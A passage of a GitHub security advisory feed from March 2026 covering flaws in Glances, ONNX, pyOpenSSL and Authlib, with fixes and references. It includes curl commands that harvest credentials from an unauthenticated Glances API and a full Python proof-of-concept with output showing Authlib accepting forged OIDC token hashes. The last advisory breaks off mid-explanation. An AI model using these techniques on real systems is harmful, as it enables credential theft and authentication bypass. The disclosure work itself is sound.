<li><a href="https://github.com/nicolargo/glances/commit/6f4ec53d967478e69917078e6f73f448001bf107">https://github.com/nicolargo/glances/commit/6f4ec53d967478e69917078e6f73f448001bf107</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-vcv2-q258-wrg7">https://github.com/advisories/GHSA-vcv2-q258-wrg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vcv2-q258-wrg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:26:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances exposes the REST API without authentication]]></title>
        <id>https://github.com/advisories/GHSA-wvxv-4j8q-4wjq</id>
        <link href="https://github.com/advisories/GHSA-wvxv-4j8q-4wjq"/>
        <updated>2026-03-16T16:23:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Glances web server runs without authentication by default when started with <code>glances -w</code>, exposing REST API with sensitive system information including process command-lines containing credentials (passwords, API keys, tokens) to any network client.</p>
<h3 id="details">Details</h3>
<p>Root Cause: Authentication is optional and disabled by default. When no password is provided, the API router initializes without authentication dependency, and the server binds to 0.0.0.0 exposing all endpoints.</p>
<p>Affected Code:</p>
<ul>
<li>File: <code>glances/outputs/glances_restful_api.py</code>, lines 259-272</li>
</ul>
<pre><code class="language-python">if self.args.password:
    self._password = GlancesPassword(username=args.username, config=config)
    if JWT_AVAILABLE:
        jwt_secret = config.get_value('outputs', 'jwt_secret_key', default=None)
        jwt_expire = config.get_int_value('outputs', 'jwt_expire_minutes', default=60)
        self._jwt_handler = JWTHandler(secret_key=jwt_secret, expire_minutes=jwt_expire)
        logger.info(f"JWT authentication enabled (token expiration: {jwt_expire} minutes)")
    else:
        self._jwt_handler = None
        logger.info("JWT authentication not available (python-jose not installed)")
else:
    self._password = None  # NO AUTHENTICATION BY DEFAULT
    self._jwt_handler = None
</code></pre>
<ul>
<li>File: <code>glances/outputs/glances_restful_api.py</code>, lines 477-480</li>
</ul>
<pre><code class="language-python">if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)  # NO AUTH DEPENDENCY
</code></pre>
<ul>
<li>File: <code>glances/outputs/glances_restful_api.py</code>, lines 98-99</li>
</ul>
<pre><code class="language-python">self.bind_address = args.bind_address or "0.0.0.0"  # BINDS TO ALL INTERFACES
self.port = args.port or 61208
</code></pre>
<ul>
<li>File: <code>glances/plugins/processlist/__init__.py</code>, lines 127-140</li>
</ul>
<pre><code class="language-python">enable_stats = [
    'cpu_percent',
    'memory_percent',
    'memory_info',
    'pid',
    'username',
    'cpu_times',
    'num_threads',
    'nice',
    'status',
    'io_counters',
    'cpu_num',
    'cmdline',  # FULL COMMAND LINE EXPOSED, NO SANITIZATION
]
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Start Glances in default web server mode:</li>
</ol>
<pre><code class="language-bash">glances -w
# Output: Glances Web User Interface started on http://0.0.0.0:61208/
</code></pre>
<ol start="2">
<li>Access API without authentication from any network client:</li>
</ol>
<pre><code class="language-bash">curl -s http://TARGET:61208/api/4/system | jq .
</code></pre>
<img width="593" height="265" alt="image" src="https://github.com/user-attachments/assets/4ec461be-b480-46d5-88e2-f4004f4dae54">


<ol start="3">
<li>Extract system information:</li>
</ol>
<pre><code class="language-bash">curl -s http://TARGET:61208/api/4/all &gt; system_dump.json
</code></pre>
<img width="688" height="547" alt="image" src="https://github.com/user-attachments/assets/7564fb2a-7d94-4c26-848a-03034214b8c7">

<ol start="4">
<li>Harvest credentials from process list:</li>
</ol>
<pre><code class="language-bash">curl -s http://TARGET:61208/api/4/processlist | \
  jq -r '.[] | select(.cmdline | tostring | test("password|api-key|token|secret"; "i")) | 
  {pid, username, process: .name, cmdline}'
</code></pre>
<ol start="5">
<li>Example credential exposure:</li>
</ol>
<pre><code class="language-json">{
  "pid": 4059,
  "username": "root",
  "process": "python3",
  "cmdline": [
    "python3",
    "-c",
    "import time; time.sleep(3600)",
    "--api-key=sk-super-secret-token-12345",
    "--password=MySecretPassword123",
    "--db-pass=admin123"
  ]
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Complete system reconnaissance and credential harvesting from any network client. Exposed endpoints include system info, process lists with full command-line arguments (containing passwords/API keys/tokens), network connections, filesystems, and Docker containers. Enables lateral movement and targeted attacks using stolen credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-wvxv-4j8q-4wjq">https://github.com/nicolargo/glances/security/advisories/GHSA-wvxv-4j8q-4wjq</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/208d876118fea5758970f33fd7474908bd403d25">https://github.com/nicolargo/glances/commit/208d876118fea5758970f33fd7474908bd403d25</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-wvxv-4j8q-4wjq">https://github.com/advisories/GHSA-wvxv-4j8q-4wjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvxv-4j8q-4wjq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:23:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onnx] ONNX Untrusted Model Repository Warnings Suppressed by silent=True in onnx.hub.load() — Silent Supply-Chain Attack]]></title>
        <id>https://github.com/advisories/GHSA-hqmj-h5c6-369m</id>
        <link href="https://github.com/advisories/GHSA-hqmj-h5c6-369m"/>
        <updated>2026-03-16T16:23:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A security control bypass exists in onnx.hub.load() due to improper logic in the repository trust verification mechanism. While the function is designed to warn users when loading models from non-official sources, the use of the silent=True parameter completely suppresses all security warnings and confirmation prompts.</p>
<h3 id="the-technical-flaw">The Technical Flaw</h3>
<p>The vulnerability is located in onnx/hub.py. The security gate uses a short-circuit evaluation that prioritizes the "silent" preference over the trust requirement:</p>
<pre><code class="language-Python">if not _verify_repo_ref(repo) and not silent:
    # This block (Warning + User Input) is SKIPPED if silent=True
    print("The model repo... is not trusted")
    if input().lower() != "y":
        return None
</code></pre>
<p><strong>Key Points of Failure</strong>:
Complete Suppression: If a developer or a third-party library sets silent=True, the application will download and execute models from any attacker-controlled GitHub repository without notifying the user.
<strong>Integrity Verification Bypass</strong>: The SHA256 integrity check validates the model against a manifest file. Since the attacker controls the repository, they also control the manifest, allowing them to provide a "valid" hash for a malicious model.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability transforms a standard model-loading function into a vector for Zero-Interaction Supply-Chain Attacks. When chained with file-system vulnerabilities , an attacker can silently exfiltrate sensitive files ( SSH keys, cloud credentials) from the victim's machine the moment the model is loaded.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m">https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m</a></li>
<li><a href="https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md">https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md</a></li>
<li><a href="https://github.com/advisories/GHSA-hqmj-h5c6-369m">https://github.com/advisories/GHSA-hqmj-h5c6-369m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqmj-h5c6-369m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:23:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyopenssl] pyOpenSSL DTLS cookie callback buffer overflow]]></title>
        <id>https://github.com/advisories/GHSA-5pwr-322w-8jr4</id>
        <link href="https://github.com/advisories/GHSA-5pwr-322w-8jr4"/>
        <updated>2026-03-16T16:22:29.000Z</updated>
        <content type="html"><![CDATA[<p>If a user provided callback to <code>set_cookie_generate_callback</code> returned a cookie value greater than 256 bytes, pyOpenSSL would overflow an OpenSSL provided buffer.</p>
<p>Cookie values that are too long are now rejected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/pyopenssl/security/advisories/GHSA-5pwr-322w-8jr4">https://github.com/pyca/pyopenssl/security/advisories/GHSA-5pwr-322w-8jr4</a></li>
<li><a href="https://github.com/pyca/pyopenssl/commit/57f09bb4bb051d3bc2a1abd36e9525313d5cd408">https://github.com/pyca/pyopenssl/commit/57f09bb4bb051d3bc2a1abd36e9525313d5cd408</a></li>
<li><a href="https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst">https://github.com/pyca/pyopenssl/blob/358cbf29c4e364c59930e53a270116249581eaa3/CHANGELOG.rst</a></li>
<li><a href="https://github.com/advisories/GHSA-5pwr-322w-8jr4">https://github.com/advisories/GHSA-5pwr-322w-8jr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5pwr-322w-8jr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:22:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib: Fail-Open Cryptographic Verification in OIDC Hash Binding]]></title>
        <id>https://github.com/advisories/GHSA-m344-f55w-2m6j</id>
        <link href="https://github.com/advisories/GHSA-m344-f55w-2m6j"/>
        <updated>2026-03-16T21:54:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-executive-summary">1. Executive Summary</h2>
<p>A critical library-level vulnerability was identified in the <strong>Authlib</strong> Python library concerning the validation of OpenID Connect (OIDC) ID Tokens. Specifically, the internal hash verification logic (<code>_verify_hash</code>) responsible for validating the <code>at_hash</code> (Access Token Hash) and <code>c_hash</code> (Authorization Code Hash) claims exhibits a <strong>fail-open</strong> behavior when encountering an unsupported or unknown cryptographic algorithm. </p>
<p>This flaw allows an attacker to bypass mandatory integrity protections by supplying a forged ID Token with a deliberately unrecognized <code>alg</code> header parameter. The library intercepts the unsupported state and silently returns <code>True</code> (validation passed), inherently violating fundamental cryptographic design principles and direct OIDC specifications.</p>
<hr>
<h2 id="2-technical-details--root-cause">2. Technical Details &amp; Root Cause</h2>
<p>The vulnerability resides within the <code>_verify_hash(signature, s, alg)</code> function in <code>authlib/oidc/core/claims.py</code>:</p>
<pre><code class="language-python">def _verify_hash(signature, s, alg):
    hash_value = create_half_hash(s, alg)
    if not hash_value:        # ← VULNERABILITY: create_half_hash returns None for unknown algorithms
        return True            # ← BYPASS: The verification silently passes
    return hmac.compare_digest(hash_value, to_bytes(signature))
</code></pre>
<p>When an unsupported algorithm string (e.g., <code>"XX999"</code>) is processed by the helper function <code>create_half_hash</code> in <code>authlib/oidc/core/util.py</code>, the internal <code>getattr(hashlib, hash_type, None)</code> call fails, and the function correctly returns <code>None</code>. </p>
<p>However, instead of triggering a <code>Fail-Closed</code> cryptographic state (raising an exception or returning <code>False</code>), the <code>_verify_hash</code> function misinterprets the <code>None</code> return value and explicitly returns <code>True</code>. </p>
<p>Because developers rely on the standard <code>.validate()</code> method provided by Authlib's <code>IDToken</code> class—which internally calls this flawed function—there is <strong>no mechanism for the implementing developer to prevent this bypass</strong>. It is a strict library-level liability.</p>
<hr>
<h2 id="3-attack-scenario">3. Attack Scenario</h2>
<p>This vulnerability exposes applications utilizing Hybrid or Implicit OIDC flows to <strong>Token Substitution Attacks</strong>.</p>
<ol>
<li>An attacker initiates an OIDC flow and receives a legitimately signed ID Token, but wishes to substitute the bound Access Token (<code>access_token</code>) or Authorization Code (<code>code</code>) with a malicious or mismatched one.</li>
<li>The attacker re-crafts the JWT header of the ID Token, setting the <code>alg</code> parameter to an arbitrary, unsupported value (e.g., <code>{"alg": "CUSTOM_ALG"}</code>).</li>
<li>The server uses Authlib to validate the incoming token. The JWT signature validation might pass (or be previously cached/bypassed depending on state), progressing to the claims validation phase.</li>
<li>Authlib attempts to validate the <code>at_hash</code> or <code>c_hash</code> claims. </li>
<li>Because <code>"CUSTOM_ALG"</code> is unsupported by <code>hashlib</code>, <code>create_half_hash</code> returns <code>None</code>.</li>
<li>Authlib's <code>_verify_hash</code> receives <code>None</code> and silently returns <code>True</code>.</li>
<li><strong>Result:</strong> The application accepts the substituted/malicious Access Token or Authorization Code without any cryptographic verification of the binding hash.</li>
</ol>
<hr>
<h2 id="4-specification--standards-violations">4. Specification &amp; Standards Violations</h2>
<p>This explicit fail-open behavior violates multiple foundational RFCs and Core Specifications. A secure cryptographic library <strong>MUST</strong> fail and reject material when encountering unsupported cryptographic parameters.</p>
<p><strong>OpenID Connect Core 1.0</strong></p>
<ul>
<li><strong>§ 3.2.2.9 (Access Token Validation):</strong> "If the ID Token contains an <code>at_hash</code> Claim, the Client MUST verify that the hash value of the Access Token matches the value of the <code>at_hash</code> Claim." Silencing the validation check natively contradicts this absolute requirement.</li>
<li><strong>§ 3.3.2.11 (Authorization Code Validation):</strong> Identically mandates the verification of the <code>c_hash</code> Claim.</li>
</ul>
<p><strong>IETF JSON Web Token (JWT) Best Current Practices (BCP)</strong></p>
<ul>
<li><strong>RFC 8725 § 3.1.1:</strong> "Libraries MUST NOT trust the signature without verifying it according to the algorithm... if validation fails, the token MUST be rejected." Authlib's implementation effectively "trusts" the hash when it cannot verify the algorithm.</li>
</ul>
<p><strong>IETF JSON Web Signature (JWS)</strong></p>
<ul>
<li><strong>RFC 7515 § 5.2 (JWS Validation):</strong> Cryptographic validations must reject the payload if the specified parameters are unsupported. By returning <code>True</code> for an <code>UnsupportedAlgorithm</code> state, Authlib violates robust application security logic.</li>
</ul>
<hr>
<h2 id="5-remediation-recommendation">5. Remediation Recommendation</h2>
<p>The <code>_verify_hash</code> function must be patched to enforce a <code>Fail-Closed</code> posture. If an algorithm is unsupported and cannot produce a hash for comparison, the validation <strong>must</strong> fail immediately.</p>
<p><strong>Suggested Patch (<code>authlib/oidc/core/claims.py</code>):</strong></p>
<pre><code class="language-python">def _verify_hash(signature, s, alg):
    hash_value = create_half_hash(s, alg)
    if hash_value is None:
        # FAIL-CLOSED: The algorithm is unsupported, reject the token.
        return False
    return hmac.compare_digest(hash_value, to_bytes(signature))
</code></pre>
<hr>
<h2 id="6-proof-of-concept-poc">6. Proof of Concept (PoC)</h2>
<p>The following standalone script mathematically demonstrates the vulnerability across the Root Cause, Implicit Flow (<code>at_hash</code>), Hybrid Flow (<code>c_hash</code>), and the entire attack surface. It utilizes Authlib's own validation logic to prove the Fail-Open behavior.```bash</p>
<pre><code class="language-bash">python3 -m venv venv
source venv/bin/activate
pip install authlib cryptography
python3 -c "import authlib; print(authlib.__version__)"
# → 1.6.8
</code></pre>
<pre><code class="language-python">#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@title          OIDC at_hash / c_hash Verification Bypass
@affected       authlib &lt;= 1.6.8
@file           authlib/oidc/core/claims.py :: _verify_hash()
@notice         _verify_hash() retorna True cuando create_half_hash() retorna
                None (alg no soportado), causando Fail-Open en la verificacion
                de binding entre ID Token y Access Token / Authorization Code.
@dev            Reproduce el bypass directamente contra el codigo de authlib
                sin mocks. Todas las llamadas son al modulo real instalado.
"""

import hmac
import hashlib
import base64
import time

import authlib
from authlib.common.encoding   import to_bytes
from authlib.oidc.core.util    import create_half_hash
from authlib.oidc.core.claims  import IDToken, HybridIDToken
from authlib.oidc.core.claims  import _verify_hash as authlib_verify_hash

# ─── helpers ──────────────────────────────────────────────────────────────────

R   = "\033[0m"
RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
BLD = "\033[1m"
DIM = "\033[2m"

def header(title):
    print(f"\n{CYN}{'─' * 64}{R}")
    print(f"{BLD}{title}{R}")
    print(f"{CYN}{'─' * 64}{R}")

def ok(msg):   print(f"  {GRN}[OK]      {R}{msg}")
def fail(msg): print(f"  {RED}[BYPASS]  {R}{BLD}{msg}{R}")
def info(msg): print(f"  {DIM}          {msg}{R}")

def at_hash_correct(token: str, alg: str) -&gt; str:
    """
    @notice  Computa at_hash segun OIDC Core 1.0 s3.2.2.9.
    @param   token  Access token ASCII
    @param   alg    Algoritmo del header del ID Token
    @return  str    at_hash en Base64url sin padding
    """
    fn = {"256": hashlib.sha256, "384": hashlib.sha384, "512": hashlib.sha512}
    digest = fn.get(alg[-3:], hashlib.sha256)(token.encode()).digest()
    return base64.urlsafe_b64encode(digest[:len(digest)//2]).rstrip(b"=").decode()


def _verify_hash_patched(signature: str, s: str, alg: str) -&gt; bool:
    """
    @notice  Version corregida de _verify_hash() con semantica Fail-Closed.
    @dev     Fix: `if not hash_value` -&gt; `if hash_value is None`
             None es falsy en Python, pero b"" no lo es. El chequeo original
             no distingue entre "algoritmo no soportado" y "hash vacio".
    """
    hash_value = create_half_hash(s, alg)
    if hash_value is None:
        return False
    return hmac.compare_digest(hash_value, to_bytes(signature))

# ─── test 1: root cause ───────────────────────────────────────────────────────

def test_root_cause():
    """
    @notice  Demuestra que create_half_hash() retorna None para alg desconocido
             y que _verify_hash() interpreta ese None como verificacion exitosa.
    """
    header("TEST 1 - Root Cause: create_half_hash() + _verify_hash()")

    token    = "real_access_token_from_AS"
    fake_sig = "AAAAAAAAAAAAAAAAAAAAAA"
    alg      = "CUSTOM_ALG"

    half_hash = create_half_hash(token, alg)
    info(f"create_half_hash(token, {alg!r})  -&gt;  {half_hash!r}  (None = alg no soportado)")

    result_vuln    = authlib_verify_hash(fake_sig, token, alg)
    result_patched = _verify_hash_patched(fake_sig, token, alg)

    print()
    if result_vuln:
        fail(f"authlib _verify_hash() retorno True con firma falsa y alg={alg!r}")
    else:
        ok(f"authlib _verify_hash() retorno False")

    if not result_patched:
        ok(f"_verify_hash_patched() retorno False (fail-closed correcto)")
    else:
        fail(f"_verify_hash_patched() retorno True")

# ─── test 2: IDToken.validate_at_hash() bypass ────────────────────────────────

def test_at_hash_bypass():
    """
    @notice  Demuestra el bypass end-to-end en IDToken.validate_at_hash().
             El atacante modifica el header alg del JWT a un valor no soportado.
             validate_at_hash() no levanta excepcion -&gt; token aceptado.

    @dev     Flujo real de authlib:
               validate_at_hash() -&gt; _verify_hash(at_hash, access_token, alg)
               -&gt; create_half_hash(access_token, "CUSTOM_ALG") -&gt; None
               -&gt; `if not None` -&gt; True -&gt; no InvalidClaimError -&gt; BYPASS
    """
    header("TEST 2 - IDToken.validate_at_hash() Bypass (Implicit / Hybrid Flow)")

    real_token  = "ya29.LEGITIMATE_token_from_real_AS"
    evil_token  = "ya29.MALICIOUS_token_under_attacker_control"
    fake_at_hash = "FAAAAAAAAAAAAAAAAAAAA"

    # --- caso A: token legitimo con alg correcto ---
    correct_hash = at_hash_correct(real_token, "RS256")
    token_legit  = IDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "at_hash": correct_hash},
        {"access_token": real_token}
    )
    token_legit.header = {"alg": "RS256"}

    try:
        token_legit.validate_at_hash()
        ok(f"Caso A (legitimo, RS256):  at_hash={correct_hash}  -&gt;  aceptado")
    except Exception as e:
        fail(f"Caso A rechazo el token legitimo: {e}")

    # --- caso B: token malicioso con alg forjado ---
    token_forged = IDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "at_hash": fake_at_hash},
        {"access_token": evil_token}
    )
    token_forged.header = {"alg": "CUSTOM_ALG"}

    try:
        token_forged.validate_at_hash()
        fail(f"Caso B (atacante, alg=CUSTOM_ALG):  at_hash={fake_at_hash}  -&gt;  BYPASS exitoso")
        info(f"access_token del atacante aceptado: {evil_token}")
    except Exception as e:
        ok(f"Caso B rechazado correctamente: {e}")

# ─── test 3: HybridIDToken.validate_c_hash() bypass ──────────────────────────

def test_c_hash_bypass():
    """
    @notice  Mismo bypass pero para c_hash en Hybrid Flow.
             Permite Authorization Code Substitution Attack.
    @dev     OIDC Core 1.0 s3.3.2.11 exige verificacion obligatoria de c_hash.
             Authlib la omite cuando el alg es desconocido.
    """
    header("TEST 3 - HybridIDToken.validate_c_hash() Bypass (Hybrid Flow)")

    real_code  = "SplxlOBeZQQYbYS6WxSbIA"
    evil_code  = "ATTACKER_FORGED_AUTH_CODE"
    fake_chash = "ZZZZZZZZZZZZZZZZZZZZZZ"

    token = HybridIDToken(
        {"iss": "https://idp.example.com", "sub": "user", "aud": "client",
         "exp": int(time.time()) + 3600, "iat": int(time.time()),
         "nonce": "n123", "at_hash": "AAAA", "c_hash": fake_chash},
        {"code": evil_code, "access_token": "sometoken"}
    )
    token.header = {"alg": "XX9999"}

    try:
        token.validate_c_hash()
        fail(f"c_hash={fake_chash!r} aceptado con alg=XX9999 -&gt; Authorization Code Substitution posible")
        info(f"code del atacante aceptado: {evil_code}")
    except Exception as e:
        ok(f"Rechazado correctamente: {e}")

# ─── test 4: superficie de ataque ─────────────────────────────────────────────

def test_attack_surface():
    """
    @notice  Mapea todos los valores de alg que disparan el bypass.
    @dev     create_half_hash hace: getattr(hashlib, f"sha{alg[2:]}", None)
             Cualquier string que no resuelva a un atributo de hashlib -&gt; None -&gt; bypass.
    """
    header("TEST 4 - Superficie de Ataque")

    token    = "test_token"
    fake_sig = "AAAAAAAAAAAAAAAAAAAAAA"

    vectors = [
        "CUSTOM_ALG", "XX9999", "none", "None", "", "RS", "SHA256",
        "HS0", "EdDSA256", "PS999", "RS 256", "../../../etc", "' OR '1'='1",
    ]

    print(f"  {'alg':&lt;22}  {'half_hash':&lt;10}  resultado")
    print(f"  {'-'*22}  {'-'*10}  {'-'*20}")

    for alg in vectors:
        hv     = create_half_hash(token, alg)
        result = authlib_verify_hash(fake_sig, token, alg)
        hv_str = "None" if hv is None else "bytes"
        res_str = f"{RED}BYPASS{R}" if result else f"{GRN}OK{R}"
        print(f"  {alg!r:&lt;22}  {hv_str:&lt;10}  {res_str}")

# ─── main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\n{BLD}authlib {authlib.__version__} - OIDC Hash Verification Bypass PoC{R}")
    print(f"authlib/oidc/core/claims.py :: _verify_hash() \n")

    test_root_cause()
    test_at_hash_bypass()
    test_c_hash_bypass()
    test_attack_surface()

    print(f"\n{DIM}Fix: `if not hash_value` -&gt; `if hash_value is None` en _verify_hash(){R}\n")
</code></pre>
<hr>
<h2 id="output">Output</h2>
<pre><code class="language-bash">uthlib 1.6.8 - OIDC Hash Verification Bypass PoC
authlib/oidc/core/claims.py :: _verify_hash() 


────────────────────────────────────────────────────────────────
TEST 1 - Root Cause: create_half_hash() + _verify_hash()
────────────────────────────────────────────────────────────────
            create_half_hash(token, 'CUSTOM_ALG')  -&gt;  None  (None = alg no soportado)

  [BYPASS]  authlib _verify_hash() retorno True con firma falsa y alg='CUSTOM_ALG'
  [OK]      _verify_hash_patched() retorno False (fail-closed correcto)

────────────────────────────────────────────────────────────────
TEST 2 - IDToken.validate_at_hash() Bypass (Implicit / Hybrid Flow)
────────────────────────────────────────────────────────────────
  [OK]      Caso A (legitimo, RS256):  at_hash=gh_beqqliVkRPAXdOz2Gbw  -&gt;  aceptado
  [BYPASS]  Caso B (atacante, alg=CUSTOM_ALG):  at_hash=FAAAAAAAAAAAAAAAAAAAA  -&gt;  BYPASS exitoso
            access_token del atacante aceptado: ya29.MALICIOUS_token_under_attacker_control

────────────────────────────────────────────────────────────────
TEST 3 - HybridIDToken.validate_c_hash() Bypass (Hybrid Flow)
────────────────────────────────────────────────────────────────
  [BYPASS]  c_hash='ZZZZZZZZZZZZZZZZZZZZZZ' aceptado con alg=XX9999 -&gt; Authorization Code Substitution posible
            code del atacante aceptado: ATTACKER_FORGED_AUTH_CODE

────────────────────────────────────────────────────────────────
TEST 4 - Superficie de Ataque
────────────────────────────────────────────────────────────────
  alg                     half_hash   resultado
  ----------------------  ----------  --------------------
  'CUSTOM_ALG'            None        BYPASS
  'XX9999'                None        BYPASS
  'none'                  None        BYPASS
  'None'                  None        BYPASS
  ''                      None        BYPASS
  'RS'                    None        BYPASS
  'SHA256'                None        BYPASS
  'HS0'                   None        BYPASS
  'EdDSA256'              None        BYPASS
  'PS999'                 None        BYPASS
  'RS 256'                None        BYPASS
  '../../../etc'          None        BYPASS
  "' OR '1'='1"           None        BYPASS

Fix: `if not hash_value` -&gt; `if hash_value is None` en _verify_hash()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-m344-f55w-2m6j">https://github.com/authlib/authlib/security/advisories/GHSA-m344-f55w-2m6j</a></li>
<li><a href="https://github.com/authlib/authlib/commit/b9bb2b25bf8b7e01512d847a95c1749646eaa72b">https://github.com/authlib/authlib/commit/b9bb2b25bf8b7e01512d847a95c1749646eaa72b</a></li>
<li><a href="https://github.com/authlib/authlib/releases/tag/v1.6.9">https://github.com/authlib/authlib/releases/tag/v1.6.9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28498">https://nvd.nist.gov/vuln/detail/CVE-2026-28498</a></li>
<li><a href="https://github.com/advisories/GHSA-m344-f55w-2m6j">https://github.com/advisories/GHSA-m344-f55w-2m6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m344-f55w-2m6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:15:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib Vulnerable to JWE RSA1_5 Bleichenbacher Padding Oracle]]></title>
        <id>https://github.com/advisories/GHSA-7432-952r-cw78</id>
        <link href="https://github.com/advisories/GHSA-7432-952r-cw78"/>
        <updated>2026-03-16T21:54:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-executive-summary">1. Executive Summary</h2>
<p>A cryptographic padding oracle vulnerability was identified in the Authlib Python library
concerning the implementation of the JSON Web Encryption (JWE) <code>RSA1_5</code> key management
algorithm. Authlib registers <code>RSA1_5</code> in its default algorithm registry without requiring
explicit opt-in, and actively destroys the constant-time Bleichenbacher mitigation that
the underlying <code>cryptography</code> library implements correctly.</p>
<p>When <code>cryptography</code> encounters an invalid PKCS#1 v1.5 padding, it returns a randomized
byte string instead of raising an exception — the correct behavior per RFC 3218 §2.3.2.
Authlib ignores this contract and raises <code>ValueError('Invalid "cek" length')</code> immediately
after decryption, before reaching AES-GCM tag validation. This creates a clean, reliable
<strong>Exception Oracle</strong>:</p>
<ul>
<li><strong>Invalid padding</strong> → <code>cryptography</code> returns random bytes → Authlib length check fails
→ <code>ValueError: Invalid "cek" length</code></li>
<li><strong>Valid padding, wrong MAC</strong> → decryption succeeds → length check passes → AES-GCM
fails → <code>InvalidTag</code></li>
</ul>
<p><strong>This oracle is active by default in every Authlib installation without any special
configuration by the developer or the attacker.</strong> The three most widely used Python web
frameworks — Flask, Django, and FastAPI — all expose distinguishable HTTP responses for
these two exception classes in their default configurations, requiring no additional
setup to exploit.</p>
<p><strong>Empirically confirmed on authlib 1.6.8 + cryptography 46.0.5:</strong></p>
<pre><code>[PADDING INVALIDO]     ValueError: Invalid "cek" length
[PADDING VALIDO/MAC]   InvalidTag
</code></pre>
<hr>
<h2 id="2-technical-details--root-cause">2. Technical Details &amp; Root Cause</h2>
<h3 id="21-vulnerable-code">2.1 Vulnerable Code</h3>
<p><strong>File:</strong> <code>authlib/jose/rfc7518/jwe_algs.py</code></p>
<pre><code class="language-python">def unwrap(self, enc_alg, ek, headers, key):
    op_key = key.get_op_key("unwrapKey")

    # cryptography implements Bleichenbacher mitigation here:
    # on invalid padding it returns random bytes instead of raising.
    # Empirically confirmed: returns 84 bytes for a 2048-bit key.
    cek = op_key.decrypt(ek, self.padding)

    # VULNERABILITY: This length check destroys the mitigation.
    # cryptography returned 84 random bytes. len(84) * 8 = 672 != 128 (A128GCM CEK_SIZE).
    # Authlib raises a distinct ValueError before AES-GCM is ever reached.
    if len(cek) * 8 != enc_alg.CEK_SIZE:
        raise ValueError('Invalid "cek" length')   # &lt;- ORACLE TRIGGER

    return cek
</code></pre>
<h3 id="22-root-cause--active-mitigation-destruction">2.2 Root Cause — Active Mitigation Destruction</h3>
<p><code>cryptography</code> 46.0.5 implements the Bleichenbacher mitigation correctly at the library
level. When PKCS#1 v1.5 padding validation fails, it does not raise an exception.
Instead it returns a randomized byte string (empirically observed: 84 bytes for a
2048-bit RSA key). The caller is expected to pass this fake key to the symmetric
decryptor, where MAC/tag validation will fail in constant time — producing an error
indistinguishable from a MAC failure on a valid padding.</p>
<p>Authlib does not honor this contract. The length check on the following line detects
that 84 bytes != 16 bytes (128-bit CEK for A128GCM) and raises <code>ValueError('Invalid "cek" length')</code> immediately. This exception propagates before AES-GCM is ever reached,
creating two execution paths with observable differences:</p>
<pre><code>Path A — invalid PKCS#1 v1.5 padding:
  op_key.decrypt() -&gt; 84 random bytes  (cryptography mitigation active)
  len(84) * 8 = 672 != 128            (CEK_SIZE for A128GCM)
  raise ValueError('Invalid "cek" length')    &lt;- specific exception, fast path

Path B — valid padding, wrong symmetric key:
  op_key.decrypt() -&gt; 16 correct bytes
  len(16) * 8 = 128 == 128            -&gt; length check passes
  AES-GCM tag validation -&gt; mismatch
  raise InvalidTag                            &lt;- different exception class, slow path
</code></pre>
